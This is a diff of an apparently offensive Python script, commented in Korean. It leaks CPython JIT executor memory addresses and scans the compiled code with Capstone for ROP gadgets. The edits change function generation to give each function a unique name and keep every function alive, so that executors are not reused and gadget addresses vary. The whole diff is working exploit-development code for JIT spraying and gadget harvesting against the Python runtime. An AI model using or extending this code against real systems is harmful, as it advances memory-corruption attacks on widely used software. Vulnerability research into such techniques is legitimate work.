@@ -32,8 +32,14 @@ def allocate_rwx(size=PAGE_SIZE):
     return addr
 
 def generate_jit_func_named(seed, magic_value):
+    """
+    JIT 함수 생성 (test_runtime_jit_scan.py의 검증된 패턴)
+    
+    각 seed마다 고유한 함수 이름 (jit_func_{seed}) 생성
+    → 다른 code object → 다른 executor 할당 기대
+    """
     code = f"""
-def f(x):
+def jit_func_{seed}(x):
     # Nested helper to trigger CALL-related stencils
     def h(a, b):
         return (a ^ b) & 0xFFFFFFFF
@@ -74,7 +80,7 @@ def f(x):
 """
     scope = {}
     exec(code, scope)
-    return scope['f']
+    return scope[f'jit_func_{seed}']
 
 def find_gadgets(jit_addr, blob, gadgets_needed):
     md = Cs(CS_ARCH_X86, CS_MODE_64)
@@ -132,8 +138,8 @@ def generate_spread_jit_functions(num_functions, gadgets_needed):
     전략:
     1. 여러 모듈 생성 (메모리 할당 경계 분리)
     2. 각 모듈에 함수 분산 배치
-    3. 1MB 더미로 메모리 영역 강제 분산
-    4. 같은 프로세스 내에서 모든 gadget 주소 유효
+    3. 고유한 코드 생성으로 executor pool 재사용 방지
+    4. **모든 함수 참조 유지로 GC 방지** ← 핵심!
     """
     num_modules = min(10, num_functions)  # 최대 10개 모듈
     funcs_per_module = max(1, num_functions // num_modules)
@@ -141,19 +147,18 @@ def generate_spread_jit_functions(num_functions, gadgets_needed):
     modules = []
     all_functions = []
     all_gadgets = {}
+    jit_addresses = []  # JIT 주소 추적용
     
     print(f"\n[*] Generating {num_functions} functions across {num_modules} modules...")
-    print(f"[*] Strategy: Spread allocation in same process")
-    print(f"[*] Expected: Wide address space distribution for diverse patch_64 values")
+    print(f"[*] Strategy: Spread allocation + unique code generation")
+    print(f"[*] Expected: Each function gets unique executor → no pool reuse")
     
+    # PHASE 1: 모든 함수를 먼저 생성하고 warm up (GC 방지)
+    print("\n[PHASE 1] Creating and warming up all functions...")
     for mod_idx in range(num_modules):
-        # 새 모듈 생성 (Python 네임스페이스 분리)
         module = types.ModuleType(f"jit_spread_module_{mod_idx}")
         modules.append(module)
         
-        print(f"\n[Module {mod_idx}] Creating module with {funcs_per_module} functions...")
-        
-        # 각 모듈에 함수 생성
         for i in range(funcs_per_module):
             global_idx = mod_idx * funcs_per_module + i
             if global_idx >= num_functions:
@@ -161,10 +166,10 @@ def generate_spread_jit_functions(num_functions, gadgets_needed):
                 
             magic_value = MAGIC_VALUES[global_idx % len(MAGIC_VALUES)]
             
-            print(f"  [{mod_idx}.{i}] Generating function with magic 0x{magic_value:08X}...")
+            print(f"  [{mod_idx}.{i}] Creating unique function (seed={global_idx}, magic=0x{magic_value:08X})...")
             jit_func = generate_jit_func_named(global_idx, magic_value)
             
-            # 모듈에 등록 (메모리 할당 분산 효과)
+            # 중요: 함수 참조를 여러 곳에 유지 (GC 절대 방지)
             setattr(module, f"func_{i}", jit_func)
             all_functions.append((global_idx, jit_func, magic_value))
             
@@ -172,31 +177,46 @@ def generate_spread_jit_functions(num_functions, gadgets_needed):
             print(f"  [{mod_idx}.{i}] Warming up...")
             for j in range(5000):
                 jit_func(j)
-            
-            # JIT 메모리 접근 및 gadget 스캔
-            try:
-                jit_addr, size = jitexecleak.leak_executor_jit(jit_func)
-                print(f"  [{mod_idx}.{i}] ✓ JIT @ {hex(jit_addr)}, size: {size}")
-                
-                blob = (ctypes.c_ubyte * size).from_address(jit_addr)
-                found_gadgets = find_gadgets(jit_addr, bytes(blob), gadgets_needed)
-                
-                for key, addr in found_gadgets.items():
-                    if key not in all_gadgets:
-                        all_gadgets[key] = addr
-                        print(f"  [{mod_idx}.{i}] Found gadget: {key} @ {hex(addr)}")
-                
-            except RuntimeError as e:
-                print(f"  [{mod_idx}.{i}] ✗ JIT compilation failed: {e}")
         
-        # 메모리 할당 경계 강제 (다음 모듈이 다른 주소에 할당되도록)
+        # 1MB 더미
         if mod_idx < num_modules - 1:
-            dummy = bytearray(1024 * 1024)  # 1MB 더미
-            print(f"[Module {mod_idx}] Memory boundary enforced (1MB dummy)")
+            dummy = bytearray(1024 * 1024)
+    
+    print(f"\n[PHASE 1 COMPLETE] {len(all_functions)} functions created and warmed up")
+    print("[*] All functions kept alive (no GC) → executors should remain in memory")
+    
+    # PHASE 2: 모든 함수의 JIT 메모리 스캔 (함수들이 살아있는 상태)
+    print("\n[PHASE 2] Scanning JIT memory for all functions...")
+    unique_addresses = set()
+    
+    for global_idx, jit_func, magic_value in all_functions:
+        try:
+            jit_addr, size = jitexecleak.leak_executor_jit(jit_func)
+            unique_addresses.add(jit_addr)
+            jit_addresses.append((global_idx, jit_addr, size))
+            
+            print(f"  [Func {global_idx}] JIT @ {hex(jit_addr)}, size: {size}")
+            
+            blob = (ctypes.c_ubyte * size).from_address(jit_addr)
+            found_gadgets = find_gadgets(jit_addr, bytes(blob), gadgets_needed)
+            
+            for key, addr in found_gadgets.items():
+                if key not in all_gadgets:
+                    all_gadgets[key] = addr
+                    print(f"  [Func {global_idx}] ✓ Found gadget: {key} @ {hex(addr)}")
+            
+        except RuntimeError as e:
+            print(f"  [Func {global_idx}] ✗ JIT compilation failed: {e}")
     
     print(f"\n[+] Total functions created: {len(all_functions)}")
-    print(f"[+] Functions spread across {len(modules)} modules")
+    print(f"[+] Unique JIT addresses: {len(unique_addresses)} / {len(all_functions)}")
+    print(f"[+] Address reuse: {len(all_functions) - len(unique_addresses)} functions")
     print(f"[+] Gadgets found from JIT: {len(all_gadgets)}")
+    
+    if len(unique_addresses) > 1:
+        print("\n[✓] SUCCESS: Multiple unique addresses → executor pool bypass working!")
+    else:
+        print("\n[✗] FAILED: All functions use same address → pool still reusing")
     
     return all_gadgets, modules
 
